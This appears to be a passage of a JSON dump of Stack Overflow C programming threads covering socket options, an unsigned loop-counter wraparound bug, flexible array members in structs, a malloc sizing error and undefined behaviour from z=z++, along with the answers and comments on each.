"https://stackoverflow.com/questions/55030542/how-do-i-get-the-name-of-a-socket-option-in-c", "title": "How do I get the name of a socket option in C?", "body": "<p>I have some code that looks like this:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>    switch (option) {\n        case MVM_SO_BROADCAST:\n        case MVM_SO_KEEPALIVE:\n        case MVM_SO_REUSEADDR:\n        case MVM_SO_DONTROUTE:\n        case MVM_SO_SNDBUF:\n        case MVM_SO_RCVBUF:\n        case MVM_SO_OOBINLINE:\n        case MVM_TCP_NODELAY: {\n            int input;\n            len = sizeof(int);\n            e = getsockopt(s, SOL_SOCKET, (int)option, (char *)&amp;input, &amp;len);\n            output = input;\n            break;\n        }\n        case MVM_SO_LINGER: {\n            struct linger input;\n            len = sizeof(struct linger);\n            e = getsockopt(s, SOL_SOCKET, (int)option, (char *)&amp;input, &amp;len);\n            // Match Java's behaviour with SO_LINGER\n            output = (input.l_onoff &gt;= 0) ? input.l_linger : -1;\n            break;\n        }\n        default:\n            MVM_exception_throw_adhoc(tc, \"this socket option is not supported by MoarVM: %d\", (int)option);\n            break;\n    }\n</code></pre>\n\n<p><code>MVM_SO_BROADCAST</code> and the like are macros for <code>SO_BROADCAST</code> and the like. In the default case in the switch, I want to print the name of the socket option given instead of its value, which is useless to the end user. Is there a function in libc for this?</p>\n"}, {"tags": ["c", "bit-manipulation", "size-t"], "comments": [{"owner": {"reputation": 81, "user_id": 10778288, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-cKdVS1J_9k8/AAAAAAAAAAI/AAAAAAAAADY/lsYrvZhirh8/photo.jpg?sz=128", "display_name": "ballow", "link": "https://stackoverflow.com/users/10778288/ballow"}, "reply_to_user": {"reputation": 32686, "user_id": 10396, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/ddbfebb47432f6599da361df6a135c7c?s=128&d=identicon&r=PG", "display_name": "AShelly", "link": "https://stackoverflow.com/users/10396/ashelly"}, "edited": false, "score": 0, "creation_date": 1551899687, "post_id": 55030449, "comment_id": 96813603, "body": "i will edit my post :) good question . i declared t like that : int t;"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1551899694, "post_id": 55030449, "comment_id": 96813607, "body": "<code>size_t</code> is an <code>unsigned</code> type, so it can never become negative."}, {"owner": {"reputation": 81, "user_id": 10778288, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-cKdVS1J_9k8/AAAAAAAAAAI/AAAAAAAAADY/lsYrvZhirh8/photo.jpg?sz=128", "display_name": "ballow", "link": "https://stackoverflow.com/users/10778288/ballow"}, "edited": false, "score": 0, "creation_date": 1551899782, "post_id": 55030449, "comment_id": 96813654, "body": "i know that, that&#39;s why i&#39;m just out of ideas on how to fix it"}], "answers": [{"comments": [{"owner": {"reputation": 81, "user_id": 10778288, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-cKdVS1J_9k8/AAAAAAAAAAI/AAAAAAAAADY/lsYrvZhirh8/photo.jpg?sz=128", "display_name": "ballow", "link": "https://stackoverflow.com/users/10778288/ballow"}, "edited": false, "score": 0, "creation_date": 1551900153, "post_id": 55030600, "comment_id": 96813827, "body": "Thanks for that :) I got that now, but i still get negative j even if i have a j &gt;= 0 condition for no reason and that&#39;s my main problem."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 81, "user_id": 10778288, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-cKdVS1J_9k8/AAAAAAAAAAI/AAAAAAAAADY/lsYrvZhirh8/photo.jpg?sz=128", "display_name": "ballow", "link": "https://stackoverflow.com/users/10778288/ballow"}, "edited": false, "score": 0, "creation_date": 1551918215, "post_id": 55030600, "comment_id": 96820927, "body": "@ballow No, the main problem is not <code>j</code> becoming &quot;negative&quot;.  Yes it is <i>a</i> problem, but the main one: using &quot;continue until j negative&quot; as the terminating condition."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 81, "user_id": 10778288, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-cKdVS1J_9k8/AAAAAAAAAAI/AAAAAAAAADY/lsYrvZhirh8/photo.jpg?sz=128", "display_name": "ballow", "link": "https://stackoverflow.com/users/10778288/ballow"}, "edited": false, "score": 0, "creation_date": 1551943594, "post_id": 55030600, "comment_id": 96827627, "body": "@ballow I touched on that in the last sentence of this answer. Variable <code>j</code> has to become <code>&lt; 0</code> for the loop to terminate, which is a problem if <code>j</code> is <code>unsigned</code>."}], "tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": false, "score": 0, "last_activity_date": 1551899778, "creation_date": 1551899778, "answer_id": 55030600, "question_id": 55030449, "link": "https://stackoverflow.com/questions/55030449/loop-not-ending-when-using-a-size-t-variable/55030600#55030600", "title": "Loop not ending when using a size_t variable", "body": "<p>The type <code>size_t</code> is unsigned and so it should not be used as</p>\n\n<pre><code>printf(\"%zd \", j);      // signed version\n</code></pre>\n\n<p>it should be</p>\n\n<pre><code>printf(\"%zu \", j);      // unsigned version\n</code></pre>\n\n<p>If you want the <code>signed</code> version you can use <code>ssize_t</code> which is able to represent the number -1, and can be returned by functions as a way to indicate error.</p>\n\n<p>It can be dangerous to use an <code>unsigned</code> variable in a loop that counts downwards.</p>\n"}, {"comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1551899875, "post_id": 55030612, "comment_id": 96813694, "body": "<code>t&lt;=0</code> should be <code>t&gt;=0</code>."}, {"owner": {"reputation": 81, "user_id": 10778288, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-cKdVS1J_9k8/AAAAAAAAAAI/AAAAAAAAADY/lsYrvZhirh8/photo.jpg?sz=128", "display_name": "ballow", "link": "https://stackoverflow.com/users/10778288/ballow"}, "edited": false, "score": 0, "creation_date": 1551900468, "post_id": 55030612, "comment_id": 96813998, "body": "Now i got that, thanks for the answear. So should i use an integer instead for this case ? Or do you have any other method to treat this case ?"}], "tags": [], "owner": {"reputation": 32686, "user_id": 10396, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/ddbfebb47432f6599da361df6a135c7c?s=128&d=identicon&r=PG", "display_name": "AShelly", "link": "https://stackoverflow.com/users/10396/ashelly"}, "is_accepted": true, "score": 3, "last_activity_date": 1551900485, "last_edit_date": 1551900485, "creation_date": 1551899803, "answer_id": 55030612, "question_id": 55030449, "link": "https://stackoverflow.com/questions/55030449/loop-not-ending-when-using-a-size-t-variable/55030612#55030612", "title": "Loop not ending when using a size_t variable", "body": "<p>You are suffering from unsigned integer wraparound.</p>\n\n<pre><code>for (unsigned j = 7; j&gt;=0; j--)\n{ //whatever \n}\n</code></pre>\n\n<p>So when <code>j</code> is 0, you enter the loop, do the processing, then decrement it.  Since <code>j</code> is unsigned, it does not become, -1, but 0xFFFF.... (<code>(1&lt;&lt;sizeof(size_t))-1</code>) which is very big and definitely greater than 0.</p>\n\n<p>The best solution is to use a signed type.  You probably don't need all the bits of size_t, Unless <code>t</code>  might be larger than <code>SIZE_MAX/sizeof(long long)</code></p>\n\n<p>You say <code>t</code> is between 1 and 8. <code>sizeof(unsigned long long)</code> is almost certainly no more than 16.  So the possible range of <code>j</code> is 0..128.  You can put that in a regular signed int, (or even a signed char) with no problem.</p>\n"}, {"tags": [], "owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "is_accepted": false, "score": 3, "last_activity_date": 1551914919, "last_edit_date": 1551914919, "creation_date": 1551914393, "answer_id": 55033731, "question_id": 55030449, "link": "https://stackoverflow.com/questions/55030449/loop-not-ending-when-using-a-size-t-variable/55033731#55033731", "title": "Loop not ending when using a size_t variable", "body": "<p>The cleanest pattern for counting down using unsigned types is IMHO:</p>\n\n<pre><code>size_t idx;\nfor(idx = xxx*CHAR_BIT; idx-- &gt;0; ) {\n    ...    \n    }\n</code></pre>\n\n<hr>\n\n<p>This way you avoid expressions containing <code>-1</code> or<code>+1</code> , while guaranteeing that the loop variable will <strong>never</strong> ever be out of bounds (even if the initial value would be zero ...)</p>\n"}], "owner": {"reputation": 81, "user_id": 10778288, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-cKdVS1J_9k8/AAAAAAAAAAI/AAAAAAAAADY/lsYrvZhirh8/photo.jpg?sz=128", "display_name": "ballow", "link": "https://stackoverflow.com/users/10778288/ballow"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 204, "favorite_count": 0, "accepted_answer_id": 55030612, "answer_count": 3, "score": 0, "last_activity_date": 1551914919, "creation_date": 1551899108, "last_edit_date": 1551907747, "question_id": 55030449, "link": "https://stackoverflow.com/questions/55030449/loop-not-ending-when-using-a-size-t-variable", "title": "Loop not ending when using a size_t variable", "body": "<p>I used a size_t variable to help me do my project. However, it's not working for all the cases I want and I really don't know what's the problem. </p>\n\n<p>I use this 'for' instruction to check the bits from an unsigned long long \"map\", but when <code>t</code> variable gets to be 1, and the <code>j</code> is between 7 ( 1 * 8 - 1) and 0 ( (1 - 1) * 8 ), <code>j</code> also gets the -1, -2, -3, -4 and -5 values even if the condition is <code>j &gt;= (t - 1) * sizeof(unsigned long long)</code>, which for the 't = 1' case is <code>j &gt;= 0</code>. I really have no idea why, I replaced, for the case t = 1, the size_t with an int, but I would really like to know why is this happening, what am I doing wrong and how I can fix it.</p>\n\n<pre><code>int t; //( it gets values between 8 and 1 )\n...\nfor ( size_t j = t * sizeof(unsigned long long) - 1; \n      j &gt;= (t - 1) * sizeof(unsigned long long); \n      j--) {\n    map_mask = help64 &lt;&lt; j;\n    printf(\"%zd \",j); // that s how i figured out i get negative numbers\n                      //checking bit by bit and return 0(not fitting) if we see any bit equal\n    if ( (map_mask &amp; (*map)) == map_mask ) {\n        mask8 = help8 &lt;&lt; k;\n        if ( (mask8 &amp; p) == mask8 )\n            return 0;\n    }\n    k-- ;// a variable i used for the mask( i initiated it with k = 7, it doesnt matter here\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "struct"], "answers": [{"tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 2, "last_activity_date": 1551905815, "last_edit_date": 1551905815, "creation_date": 1551899208, "answer_id": 55030472, "question_id": 55030392, "link": "https://stackoverflow.com/questions/55030392/return-variable-struct-members/55030472#55030472", "title": "Return variable struct members", "body": "<p>You need to use a flexible array member (FAM):</p>\n\n<pre><code>typedef struct Result {\n    double  time;\n    size_t  size;\n    uint8_t data[];\n};\n</code></pre>\n\n<p>You can then allocate a block of memory with <code>malloc()</code> et al to hold the data:</p>\n\n<pre><code>uint8_t data[] = \"This is the variable length payload\";\nstruct Result *rp = malloc(sizeof(struct Result) + sizeof(data));\nrp-&gt;size = sizeof(data);\nstrcpy(rp-&gt;data, data);\nrp-&gt;time = 17.5;\n\nreturn rp;\n</code></pre>\n\n<p>You can arrange for different amounts of data \u2014 adjust the size and use <code>memmove()</code> (or <code>memcpy()</code>) to copy it.</p>\n"}, {"comments": [{"owner": {"reputation": 533, "user_id": 7839759, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8b65e869f62a18de42a40546eb4806f2?s=128&d=identicon&r=PG&f=1", "display_name": "Habebit", "link": "https://stackoverflow.com/users/7839759/habebit"}, "edited": false, "score": 0, "creation_date": 1551962084, "post_id": 55030477, "comment_id": 96838520, "body": "Thank you very much, this works as well. Had to mark the other answer as solution, because the other post was one minute earlier. Sorry."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 2, "last_activity_date": 1551899242, "creation_date": 1551899242, "answer_id": 55030477, "question_id": 55030392, "link": "https://stackoverflow.com/questions/55030392/return-variable-struct-members/55030477#55030477", "title": "Return variable struct members", "body": "<p>An unsized array element as the last member of a struct is called a <strong>flexible array member</strong>.  A struct with such a member can only be created via dynamic memory allocation, with enough space allocated for the desired size of the array.</p>\n\n<p>You can do this as follows:</p>\n\n<pre><code>typedef struct Result {\n    double time;\n    int size;\n    uint8_t data[];\n} Result;\n\nResult *foo(double time, int size) \n{\n    Result *r = calloc(1, sizeof(Result) + size*sizeof(uint8_t));\n    r-&gt;time = time;\n    r-&gt;size = size;\n    return r;\n}\n</code></pre>\n"}], "owner": {"reputation": 533, "user_id": 7839759, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8b65e869f62a18de42a40546eb4806f2?s=128&d=identicon&r=PG&f=1", "display_name": "Habebit", "link": "https://stackoverflow.com/users/7839759/habebit"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 53, "favorite_count": 0, "accepted_answer_id": 55030472, "answer_count": 2, "score": 2, "last_activity_date": 1551905815, "creation_date": 1551898847, "question_id": 55030392, "link": "https://stackoverflow.com/questions/55030392/return-variable-struct-members", "title": "Return variable struct members", "body": "<p>I need to return a struct with two values in it. A double value (<code>time</code>) and an uint8_t array with a variable size. I have two functions and both of them should return the same type of struct, but with different data members (<code>data[9], data[64]</code>).</p>\n\n<p>I've already tried to create a struct with an additional member <code>size</code>, but this isn't working at all. <code>size</code> should initialize the array with a fixed length, but the compilers says that the variable size is not defined.</p>\n\n<pre><code>typedef struct Result {\n    double time;\n    int size;\n    uint8_t data[size];\n}\n</code></pre>\n\n<p>The previous wasn't working so I tried to create an empty array and initialize it within my functions, but did not work either.</p>\n\n<pre><code>typedef struct Result {\n    double time;\n    uint8_t data[];\n} Result;\n\nResult foo() {\n    double time = 17.5;\n    uint8_t data[9] = {0};\n    Result res = {sizeof(data), time, data};\n    return res;\n}\n\nResult bar() {\n    double time = 9.5;\n    uint8_t data[64] = {4};\n    Result res = {sizeof(data), time, data};\n    return res;\n}\n\nint main(void) {\n    Result foo = foo();\n    printf(\"%.6f\\n\", foo-&gt;time);\n    uint8_t data[9] = foo-&gt;data;\n    // work with data[9] ...\n\n    Result bar = bar();\n    printf(\"%.6f\\n\", bar-&gt;time);\n    uint8_t data[64] = bar-&gt;data;\n    // work with data[64] ...\n}\n</code></pre>\n\n<p>I get this error message:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Error: return type is an incomplete type\n</code></pre>\n\n<p>The members of the struct should be available as shown in the main function. I think the compiler doesn't know how big the <code>data</code> array should be, but maybe someone can explain me this context and my question on how to return a struct with a variable sized array in it.</p>\n\n<p>I would appreciate any help, thank you very much.</p>\n"}, {"tags": ["c", "arrays", "pointers", "malloc"], "comments": [{"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1551899932, "post_id": 55030044, "comment_id": 96813718, "body": "Here&#39;s a tip: the best way to write malloc is : <code>SomeType* some_variable = malloc(n * sizeof *some_variable);</code>. For example: <code>int** H_table = malloc((len1+1) * sizeof *H_table);</code> or <code>H_table[i] = malloc((len2 + 1) * sizeof * H_table[i]);</code>. In C, it&#39;s not necessary to explicitly case the return value of malloc. Using <code>sizeof *variable</code> instead of <code>sizeof(whatever you think the type should be)</code> saves you having to think about what the type should be :-) and doesn&#39;t have to be changed if you later change the type of the variable from, for example, <code>int*</code> to <code>long*</code>"}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1551902080, "post_id": 55030044, "comment_id": 96814880, "body": "@rici and Mike Hatzak, the errors are a kind of typo, is that question useful for other people and need to stay, or is it better to delete it ?"}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1551902619, "post_id": 55030044, "comment_id": 96815197, "body": "@rici if you want I delete my answer and you put your ? ^^ When I was answering I see xing did his first remark in parallel"}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1551903208, "post_id": 55030044, "comment_id": 96815507, "body": "@rici ok I delete it"}, {"owner": {"reputation": 27, "user_id": 6085178, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/e9276adbb2ba6f030ff8b704857950cc?s=128&d=identicon&r=PG&f=1", "display_name": "Mike Hatzak", "link": "https://stackoverflow.com/users/6085178/mike-hatzak"}, "edited": false, "score": 0, "creation_date": 1551903559, "post_id": 55030044, "comment_id": 96815653, "body": "Thanks a lot everyone for answring, looks like the problem was indeed kind of a typo, but the thing that xing suggested did make it work(int-&gt;int*). so yeah, as rici said I changed everything in my code to what he said, just to be sure. If u want to delete the thread I dont mind, but it could save people some time and frustration, couse mistakes like these are what make inexperienced people hit their head on the wall :P thanks again"}], "answers": [{"tags": [], "owner": {"reputation": 39, "user_id": 1543895, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/d4ec69d55cbe816e13ec5100c8a7db8a?s=128&d=identicon&r=PG", "display_name": "Mohammad", "link": "https://stackoverflow.com/users/1543895/mohammad"}, "is_accepted": false, "score": 0, "last_activity_date": 1551898560, "creation_date": 1551898560, "answer_id": 55030321, "question_id": 55030044, "link": "https://stackoverflow.com/questions/55030044/dynamically-allocating-2d-array-in-c-error/55030321#55030321", "title": "Dynamically allocating 2d array in c error", "body": "<p>As @xing mentioned in his comment, <code>H_table</code> is a pointer to pointer to integer. so you need to change the <code>int</code> to <code>int*</code> in the first <code>malloc</code>.\nhere:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\nint main(){\n\n    int i,j;\n    char str1[]=\"xxxabxcxxxaabbcc\";\n    char str2[]=\"abc\";\n    int len1=strlen(str1);\n    int len2=strlen(str2);\n\n    printf(\"%d %d\",len1,len2);\n\n    //allocate 2d_array\n\n    int **H_table = (int**)malloc((len1+1)*sizeof(int*));\n    for (i=0; i&lt;len1+1; i++){\n        H_table[i] = (int*)malloc((len2+1)*sizeof(int));\n    }\n\n    //fill and print 2d array\n\n    for(i=0;i&lt;len1+1;i++){\n        for(j=0;j&lt;len2+1;j++){\n            printf(\"i:%d j:%d\",i,j);\n            H_table[i][j]=-1;\n            printf(\" value:%d\\n\",H_table[i][j]);\n        }\n    }\n\n    // free 2d array\n\n    for(i=0;i&lt;len1;i++){\n        free(H_table[i]);\n    }\n    free(H_table);\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "is_accepted": true, "score": 1, "last_activity_date": 1551903690, "last_edit_date": 1592644375, "creation_date": 1551903690, "answer_id": 55031569, "question_id": 55030044, "link": "https://stackoverflow.com/questions/55030044/dynamically-allocating-2d-array-in-c-error/55031569#55031569", "title": "Dynamically allocating 2d array in c error", "body": "<p>As a number of people have pointed out, you're allocating <code>H_table</code> with room for <code>len1 + 1</code> <em>integers</em> but it is actually supposed to be an array of <code>len1 + 1</code> <em>pointers</em> (to integers). Since pointers are bigger than integers (on your system, anyway), you end up with undefined behaviour from a buffer overrun.</p>\n<p>Here's a hint. Avoid this problem, and a variety of other similar issues, by always using the following model for <code>malloc</code>:</p>\n<pre><code>some_variable = malloc(n * sizeof *some_variable);\n</code></pre>\n<p>For example:</p>\n<pre><code>int** H_table = malloc((len1 + 1) * sizeof *H_table);\nfor (int i = 0; i &lt;= len1; ++i)\n  H_table[i] = malloc((len2 + 1) * sizeof *H_table[i]);\n</code></pre>\n<p>That is, let the compiler figure out the right type for the variable (or lvalue). The compiler is less prone to typos than you are, and not writing the type explicitly will make it a lot easier for you to later decide that <code>H_table</code> should have been <code>long</code> or <code>short</code> or <code>unsigned</code>.</p>\n<p>For the same reason, don't explicitly cast the return value of <code>malloc</code>. C automatically casts <code>void*</code> to the destination type, and does not provide an error if you manually cast to the wrong type. So just let the compiler do it; it's less typing, safer, and more future-proof.</p>\n<p>Note that if you use an expression with <code>sizeof</code>, the  compiler <strong>does not</strong> evaluate the expression [Note 1]. It just figures out the type and substitutes that for the expression. So don't worry about extra evaluation: there isn't any. That's also why it's ok to use this model with declarations, even though <code>some_variable</code> doesn't yet have a value when the <code>malloc</code> is executed.</p>\n<hr />\n<h3>Notes:</h3>\n<ol>\n<li>There is one circumstance in which the compiler might evaluate <code>ex</code> in <code>sizeof ex</code>: if <code>ex</code> is a variable-length array. However, in this case <code>ex</code> is always a pointer, so that case cannot apply.</li>\n</ol>\n"}], "owner": {"reputation": 27, "user_id": 6085178, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/e9276adbb2ba6f030ff8b704857950cc?s=128&d=identicon&r=PG&f=1", "display_name": "Mike Hatzak", "link": "https://stackoverflow.com/users/6085178/mike-hatzak"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 43, "favorite_count": 0, "accepted_answer_id": 55031569, "answer_count": 2, "score": 0, "last_activity_date": 1551903690, "creation_date": 1551897442, "question_id": 55030044, "link": "https://stackoverflow.com/questions/55030044/dynamically-allocating-2d-array-in-c-error", "title": "Dynamically allocating 2d array in c error", "body": "<p>My problem is prettty simple, I wanna allocate memory for a 2d array in c, fill it with -1, then free it and exit the program. My code keeps crashing and I dont know what I am doing wrong...\nThis is what I got:  </p>\n\n<pre><code>int main(){\n\n    int i,j;\n    char str1[]=\"xxxabxcxxxaabbcc\";\n    char str2[]=\"abc\";\n    int len1=strlen(str1);\n    int len2=strlen(str2);\n\n    printf(\"%d %d\",len1,len2);\n\n    //allocate 2d_array\n\n    int **H_table = (int**)malloc((len1+1)*sizeof(int));\n    for (i=0; i&lt;len1+1; i++){\n        H_table[i] = (int*)malloc((len2+1)*sizeof(int));\n    }\n\n    //fill and print 2d array\n\n    for(i=0;i&lt;len1+1;i++){\n        for(j=0;j&lt;len2+1;j++){\n            printf(\"i:%d j:%d\",i,j);\n            H_table[i][j]=-1;\n            printf(\" value:%d\\n\",H_table[i][j]);\n        }\n    }\n\n    // free 2d array\n\n    for(i=0;i&lt;len1;i++){\n        free(H_table[i]);\n    }\n    free(H_table);\n    return 0;\n}\n</code></pre>\n\n<p>So what happens is that I wanna allocate an array that has 1 extra line and 1 extra column than the 2 strings if you put them vertically compared to each other.</p>\n\n<p>And this is what I expected( the things in bracets are obviously not part of the table, I put the there for comparison):</p>\n\n<pre><code>   (x x x a b x c x x x a a b b c c)  \n  1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\na)1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\nb)1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\nc)1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  \n</code></pre>\n\n<p>The problem is that the code crashes when it fills the table, and it always crashes for i=9 and j=3, for those specific strings. The weird part is that if you swap the 2 strings(put \"abc\" in str1) then the code passes the filling stage, and crashes when it tries to free the array.</p>\n\n<p>Sorry for any grammar mistakes or stackoverflow mistakes, I am kinda new here :P </p>\n\n<p>Any idea is welcome :)  thx in advance</p>\n"}, {"tags": ["c", "operators", "sequence-points"], "answers": [{"comments": [{"owner": {"reputation": 123, "user_id": 4576973, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-qVFzd4Owl1Q/AAAAAAAAAAI/AAAAAAAAAAA/1COV64mkRSo/photo.jpg?sz=128", "display_name": "skyconfusion", "link": "https://stackoverflow.com/users/4576973/skyconfusion"}, "edited": false, "score": 0, "creation_date": 1551897221, "post_id": 55029920, "comment_id": 96812505, "body": "Thank you, i got your point. You also mean that the answer will depend on compiler."}, {"owner": {"reputation": 123, "user_id": 4576973, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-qVFzd4Owl1Q/AAAAAAAAAAI/AAAAAAAAAAA/1COV64mkRSo/photo.jpg?sz=128", "display_name": "skyconfusion", "link": "https://stackoverflow.com/users/4576973/skyconfusion"}, "edited": false, "score": 0, "creation_date": 1551897313, "post_id": 55029920, "comment_id": 96812555, "body": "Just one doubt, if I have to pick one value from 6, 7 and 8. Which one will be more general and expected answer?"}, {"owner": {"reputation": 97030, "user_id": 189205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c60305494593d556e57a3cf8e4a8c163?s=128&d=identicon&r=PG", "display_name": "interjay", "link": "https://stackoverflow.com/users/189205/interjay"}, "reply_to_user": {"reputation": 123, "user_id": 4576973, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-qVFzd4Owl1Q/AAAAAAAAAAI/AAAAAAAAAAA/1COV64mkRSo/photo.jpg?sz=128", "display_name": "skyconfusion", "link": "https://stackoverflow.com/users/4576973/skyconfusion"}, "edited": false, "score": 1, "creation_date": 1551897590, "post_id": 55029920, "comment_id": 96812679, "body": "@skyconfusion This is <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">undefined behavior</a>. You can&#39;t rely on any value."}], "tags": [], "owner": {"reputation": 13124, "user_id": 1419272, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/dcbff46aa5cd0a98d13d76595b3375f0?s=128&d=identicon&r=PG", "display_name": "alinsoar", "link": "https://stackoverflow.com/users/1419272/alinsoar"}, "is_accepted": false, "score": 0, "last_activity_date": 1551900009, "last_edit_date": 1551900009, "creation_date": 1551896924, "answer_id": 55029920, "question_id": 55029829, "link": "https://stackoverflow.com/questions/55029829/why-the-output-is-6-and-not-7/55029920#55029920", "title": "Why, the output is 6 and not 7?", "body": "<p>You are not allowed to do <code>z=z++;</code> because between 2 sequence points you are not allowed to assign a variable 2 times.</p>\n\n<p>This one is a full expression in which you assign z 2 times.  So it can be interpreted ambigously and the result of the C abstract machine is <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/BB.+Definitions#BB.Definitions-undefinedbehavior\" rel=\"nofollow noreferrer\">undefined behavior</a>.</p>\n\n<p>The same for <code>z=--z</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 97030, "user_id": 189205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c60305494593d556e57a3cf8e4a8c163?s=128&d=identicon&r=PG", "display_name": "interjay", "link": "https://stackoverflow.com/users/189205/interjay"}, "edited": false, "score": 2, "creation_date": 1551897060, "post_id": 55029921, "comment_id": 96812427, "body": "Any nonzero condition is true"}, {"owner": {"reputation": 123, "user_id": 4576973, "user_type": "registered", "accept_rate": 100, "profile_image": 